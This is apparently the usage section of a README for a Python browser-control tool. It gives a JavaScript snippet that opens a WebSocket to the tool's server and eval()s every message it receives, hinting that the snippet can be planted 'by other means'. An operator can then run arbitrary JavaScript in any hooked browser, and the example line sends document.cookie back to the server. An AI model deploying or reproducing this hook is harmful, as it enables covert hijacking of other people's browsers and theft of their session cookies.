## Usage
If you run `python main.py`, then run in the CLI:

`>listen`

It will listen for connections. 
To connect a browser, run this in the console (or by other means? :) ):
```
var socket = new WebSocket('ws://localhost:1337', 'chat'); 
socket.onmessage = function (event) {
    eval(event.data);
}
```

Then, in the CLI:

`control`

`[the number label of the session you wish to control]`

Then you will be prompted to run any Javascript you want.
To send data back to the server, you can use `socket.send`. E.g.:

```
socket.send(document.cookie);
```
